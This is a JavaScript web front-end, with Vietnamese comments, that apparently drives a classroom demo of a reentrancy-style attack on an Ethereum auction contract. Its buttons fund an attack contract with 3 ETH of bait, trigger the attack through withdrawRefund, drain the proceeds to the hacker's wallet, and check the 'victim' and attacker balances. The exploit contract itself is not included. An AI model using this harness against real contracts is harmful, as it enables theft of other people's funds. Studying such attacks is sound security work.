// app.js
let provider, signer, signerAddress;

// ABIs tối giản cho các hàm chúng ta cần gọi
let auctionABI = [
    "function getBalance() public view returns (uint)"
];
let attackABI = [
    "function setupAttack() public payable",
    "function attack() public",
    "function drainFunds() public"
];

let auctionContract, attackContract;
const statusEl = document.getElementById("status");

// 1. Connect MetaMask
document.getElementById("connectButton").onclick = async () => {
    if (!window.ethereum) {
        alert("Vui lòng cài đặt MetaMask!");
        return;
    }
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    signerAddress = await signer.getAddress();
    statusEl.innerText = "Đã kết nối với ví: " + signerAddress.substring(0, 6) + "..." + signerAddress.substring(38);
};

// Hàm tiện ích để setup contract
function setupContracts() {
    const auctionAddr = document.getElementById("auctionAddr").value;
    const attackAddr = document.getElementById("attackAddr").value;
    if (!auctionAddr || !attackAddr) {
        alert("Vui lòng nhập địa chỉ 2 hợp đồng!");
        return false;
    }
    // Kết nối với signer để có thể gửi giao dịch
    auctionContract = new ethers.Contract(auctionAddr, auctionABI, signer);
    attackContract = new ethers.Contract(attackAddr, attackABI, signer);
    statusEl.innerText = "Đã liên kết hợp đồng. Sẵn sàng!";
    return true;
}

// 2. Hacker nạp 3 ETH "mồi"
document.getElementById("setupAttackButton").onclick = async () => {
    if (!setupContracts()) return;
    statusEl.innerText = "Đang gửi 3 ETH (mồi) để setup...";
    
    try {
        const tx = await attackContract.setupAttack({ 
            value: ethers.utils.parseEther("3.0") 
        });
        await tx.wait();
        statusEl.innerText = "Setup 3 ETH (mồi) thành công.";
    } catch (err) {
        console.error(err);
        statusEl.innerText = "Lỗi khi setup: " + err.message;
    }
};

// 3. CHẠY TẤN CÔNG
document.getElementById("runAttack").onclick = async () => {
    if (!setupContracts()) return;
    statusEl.innerText = "!!! ĐANG TẤN CÔNG (gọi withdrawRefund)... !!!";
    try {
        const tx = await attackContract.attack();
        await tx.wait();
        statusEl.innerText = "TẤN CÔNG HOÀN TẤT! Hãy kiểm tra số dư.";
    } catch (err) {
        console.error(err);
        statusEl.innerText = "Lỗi khi tấn công: " + err.message;
    }
};

// 4. Rút tiền về ví
document.getElementById("drainFunds").onclick = async () => {
    if (!setupContracts()) return;
    statusEl.innerText = "Đang rút tiền về ví hacker...";
    try {
        const tx = await attackContract.drainFunds();
        await tx.wait();
        statusEl.innerText = "Đã rút hết tiền về ví.";
    } catch (err) {
        console.error(err);
        statusEl.innerText = "Lỗi khi rút tiền: " + err.message;
    }
};

// --- Các nút kiểm tra ---

document.getElementById("getAuctionBalance").onclick = async () => {
    if (!setupContracts()) return;
    try {
        const balance = await auctionContract.getBalance();
        statusEl.innerText = `Auction (Nạn nhân) Balance: ${ethers.utils.formatEther(balance)} ETH`;
    } catch (err) {
        console.error(err);
        statusEl.innerText = "Lỗi: " + err.message;
    }
};

document.getElementById("getAttackBalance").onclick = async () => {
    if (!setupContracts()) return;
    try {
        // Cách tốt nhất để lấy số dư ETH của 1 contract là dùng provider
        const balance = await provider.getBalance(attackContract.address);
        statusEl.innerText = `Attack (Hacker) Contract Balance: ${ethers.utils.formatEther(balance)} ETH`;
    } catch (err) {
        console.error(err);
        statusEl.innerText = "Lỗi: " + err.message;
    }
};
// DÒNG NÀY ĐÃ BỊ XÓA (dấu } thừa)